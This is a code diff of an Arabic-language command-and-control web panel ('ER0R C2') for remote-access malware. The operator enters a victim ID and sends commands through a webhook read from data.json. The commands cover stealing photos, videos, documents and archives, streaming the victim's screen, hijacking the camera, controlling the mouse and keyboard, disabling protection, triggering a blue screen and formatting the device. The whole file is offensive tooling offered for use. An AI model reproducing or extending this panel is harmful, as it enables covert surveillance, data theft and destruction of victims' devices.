@@ -4,67 +4,104 @@
     <meta charset="UTF-8">
     <title>ER0R C2 - SUPREME COMMAND</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; padding: 10px; text-align: center; }
-        .main { max-width: 1100px; margin: auto; border: 2px solid #6001d2; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #6001d2; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 10px; text-align: center; }
+        .main { max-width: 1100px; margin: auto; border: 2px solid #6001d2; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #6001d2; background: rgba(5, 5, 5, 0.95); }
+        
+        /* أيقونة المنظومة - باستخدام رابط مباشر مستقر */
+        .logo { width: 100px; filter: drop-shadow(0 0 10px #6001d2); margin-bottom: 10px; border-radius: 50%; }
+        
         .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 20px; }
-        .card { background: #0a0a0a; border: 1px solid #333; padding: 10px; border-radius: 10px; }
-        .btn { background: #000; border: 1px solid #6001d2; color: #fff; padding: 10px; cursor: pointer; width: 100%; margin: 3px 0; border-radius: 5px; font-weight: bold; font-size: 12px; }
-        .btn:hover { background: #6001d2; }
-        .live-view { margin-top: 15px; border: 2px solid #6001d2; height: 350px; background: #000; position: relative; }
-        .live-view img { width: 100%; height: 100%; object-fit: contain; }
-        .danger { border-color: red; color: red; }
+        .card { background: #0a0a0a; border: 1px solid #222; padding: 10px; border-radius: 10px; }
+        h3 { color: #6001d2; font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 5px; margin-bottom: 10px; }
+
+        .btn { background: #000; border: 1px solid #6001d2; color: #fff; padding: 10px; cursor: pointer; width: 100%; margin: 4px 0; border-radius: 5px; font-weight: bold; font-size: 11px; transition: 0.3s; }
+        .btn:hover { background: #6001d2; box-shadow: 0 0 10px #6001d2; }
+        
+        .btn-live { background: #ff0000; border: none; }
+        .btn-live:hover { background: #b30000; }
+        
+        .danger { border-color: #ff0044; color: #ff0044; }
+        .danger:hover { background: #ff0044; color: #fff; }
+
+        .live-view { margin-top: 20px; border: 2px solid #6001d2; height: 400px; background: #000; position: relative; border-radius: 10px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        .live-view img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        
+        .status-bar { position: absolute; top: 10px; left: 10px; background: rgba(255,0,0,0.8); color: #fff; padding: 4px 10px; font-size: 12px; font-weight: bold; border-radius: 4px; animation: blink 1s infinite; z-index: 10; }
+        @keyframes blink { 50% { opacity: 0; } }
+        
+        #log { background: #000; color: #0f0; padding: 8px; height: 60px; overflow-y: auto; margin-top: 15px; border: 1px solid #222; font-family: monospace; font-size: 12px; border-radius: 5px; text-align: left; }
     </style>
 </head>
 <body>
     <div class="main">
-        <img src="https://i.ibb.co/vz6mD7y/download.png" style="width:80px; filter:drop-shadow(0 0 10px #6001d2);">
-        <h2 style="color:#6001d2;">📟 إمبراطورية السيطرة ER0R V3</h2>
-        <input type="text" id="target" placeholder="أدخل ID الضحية" style="width:85%; padding:12px; background:#000; border:1px solid #6001d2; color:#fff; text-align:center;">
+        <img src="https://raw.githubusercontent.com/momssd/yahoo-security-update/main/icon.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2592/2592185.png'" class="logo">
+        
+        <h2 style="color:#6001d2; margin: 5px 0 15px 0;">📟 منظومة السيطرة الشاملة ER0R V3</h2>
+        
+        <input type="text" id="target" placeholder="أدخل ID الضحية المستهدف" style="width:70%; padding:12px; background:#000; border:1px solid #6001d2; color:#fff; text-align:center; border-radius: 8px; margin-bottom: 15px;">
 
         <div class="grid">
             <div class="card">
-                <h3>📁 سحب البيانات</h3>
-                <button class="btn" onclick="send('سحب صور')">🖼️ صور فقط</button>
-                <button class="btn" onclick="send('سحب فيديوهات')">🎥 فيديوهات فقط</button>
-                <button class="btn" onclick="send('سحب مستندات')">📄 مستندات</button>
-                <button class="btn" onclick="send('سحب أرشيف')">📦 ملفات مضغوطة</button>
+                <h3>📁 سحب الملفات</h3>
+                <button class="btn" onclick="send('سحب صور')">🖼️ سحب الصور</button>
+                <button class="btn" onclick="send('سحب فيديوهات')">🎥 سحب الفيديوهات</button>
+                <button class="btn" onclick="send('سحب مستندات')">📄 سحب المستندات</button>
+                <button class="btn" onclick="send('سحب أرشيف')">📦 سحب ملفات مضغوطة</button>
             </div>
+
             <div class="card">
-                <h3>👁️ بث مباشر</h3>
-                <button class="btn" style="background:red;" onclick="send('بث مباشر')">🔴 بث الشاشة</button>
-                <button class="btn" style="background:blue;" onclick="send('فتح الكاميرا')">📸 فتح الكاميرا</button>
-                <button class="btn" onclick="send('تصوير الشاشة')">📸 لقطة واحدة</button>
+                <h3>👁️ المراقبة الحية</h3>
+                <button class="btn btn-live" onclick="send('بث مباشر')">🔴 بدء بث الشاشة</button>
+                <button class="btn" onclick="send('تسجيل الشاشة')">👀 ماذا يفعل الآن؟</button>
+                <button class="btn" onclick="send('تصوير الشاشة')">📸 لقطة شاشة</button>
+                <button class="btn" style="border-color:#007bff; color:#007bff;" onclick="send('فتح الكاميرا')">📸 اختراق الكاميرا</button>
             </div>
+
             <div class="card">
-                <h3>🖱️ تحكم مباشر</h3>
+                <h3>🖱️ التحكم عن بُعد</h3>
                 <button class="btn" onclick="send('تحريك الماوس')">🖱️ تحريك الماوس</button>
                 <button class="btn" onclick="send('كتابة نص')">⌨️ كتابة نص</button>
-                <button class="btn" onclick="send('تزمير')">📢 تزمير مزعج</button>
+                <button class="btn" onclick="send('تزمير')">📢 إطلاق تزمير</button>
+                <button class="btn" onclick="send('إظهار واجهة التحكم')">📟 قفل الواجهة</button>
             </div>
+
             <div class="card">
-                <h3 style="color:red;">☢️ تدمير</h3>
+                <h3 style="color:red;">☢️ تدمير شامل</h3>
                 <button class="btn danger" onclick="send('تعطيل الحماية')">🛡️ إطفاء الحماية</button>
                 <button class="btn danger" onclick="send('شاشة الموت')">💀 شاشة الموت</button>
-                <button class="btn danger" onclick="send('فرمتة')">🔥 فرمتة كاملة</button>
+                <button class="btn danger" onclick="send('فرمتة')">🔥 فرمتة الجهاز</button>
+                <button class="btn" onclick="send('إلغاء القفل')">🔓 فك القيود</button>
             </div>
         </div>
 
         <div class="live-view">
-            <div style="position:absolute; top:5px; left:10px; color:red; font-weight:bold;">LIVE FEED...</div>
-            <img src="https://i.ibb.co/vz6mD7y/download.png" id="streamImg">
+            <div class="status-bar">LIVE STREAM ACTIVE</div>
+            <img src="https://i.pinimg.com/originals/8a/34/d9/8a34d9894e2467d5e49339e7284b2c2a.jpg" id="screenDisplay">
         </div>
+
+        <div id="log">> النظام جاهز للعمل...</div>
     </div>
 
     <script>
         async function send(c) {
             const id = document.getElementById('target').value;
-            if(!id) return alert("أدخل ID!");
-            const cfg = await fetch('./data.json').then(r => r.json());
-            await fetch(cfg.webhook_url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `⚠️ **أمر تحكم:**\nالهدف: \`${id}\`\nالأمر: **${c}**` })
-            });
+            if(!id) return alert("يرجى إدخال ID الضحية!");
+            
+            const log = document.getElementById('log');
+            log.innerHTML += `<br>> جارٍ تنفيذ: [${c}] على ${id}`;
+            log.scrollTop = log.scrollHeight;
+
+            try {
+                const res = await fetch('./data.json');
+                const config = await res.json();
+                await fetch(config.webhook_url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: `🚀 **أمر جديد:**\nالهدف: \`${id}\`\nالأمر: **${c}**` })
+                });
+            } catch (e) {
+                alert("خطأ في الاتصال بالويب هوك!");
+            }
         }
     </script>
 </body>
